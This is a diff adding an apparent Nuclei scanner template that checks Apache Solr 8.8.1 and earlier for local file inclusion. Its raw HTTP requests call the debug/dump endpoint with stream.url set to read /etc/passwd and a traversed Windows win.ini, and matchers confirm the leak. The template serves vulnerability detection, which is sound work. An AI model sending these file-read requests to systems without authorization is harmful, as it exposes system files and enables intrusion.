@@ -1,0 +1,61 @@
+id: apache-solr-file-read
+
+info:
+  name: Apache Solr <=8.8.1 - Local File Inclusion
+  author: DhiyaneshDk,philippedelteil
+  severity: high
+  description: Apache Solr versions prior to and including 8.8.1 are vulnerable to local file inclusion.
+  reference:
+    - https://twitter.com/Al1ex4/status/1382981479727128580
+    - https://nsfocusglobal.com/apache-solr-arbitrary-file-read-and-ssrf-vulnerability-threat-alert/
+    - https://twitter.com/sec715/status/1373472323538362371
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 3
+  tags: apache,solr,lfi
+
+http:
+  - raw:
+      - |
+        GET /solr/admin/cores?wt=json HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: en
+        Connection: close
+      - |
+        GET /solr/{{core}}/debug/dump?stream.url=file:///../../../../../Windows/win.ini&param=ContentStream HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: en
+        Connection: close
+      - |
+        GET /solr/{{core}}/debug/dump?stream.url=file:///etc/passwd&param=ContentStream HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: en
+        Connection: close
+
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
+
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+
+    extractors:
+      - type: regex
+        name: core
+        group: 1
+        regex:
+          - '"name"\:"(.*?)"'
+        internal: true
+# digest: 4b0a004830460221008b606ea44d36f3d3bf6e5ec47629ddbb67c627e520fec806208066d4c0d2632a022100e1e47909c874d33a3929c526ea4b4b592e796b3a58079132fc9e76dfda7b1724:922c64590222798bb761d5b6d8e72950
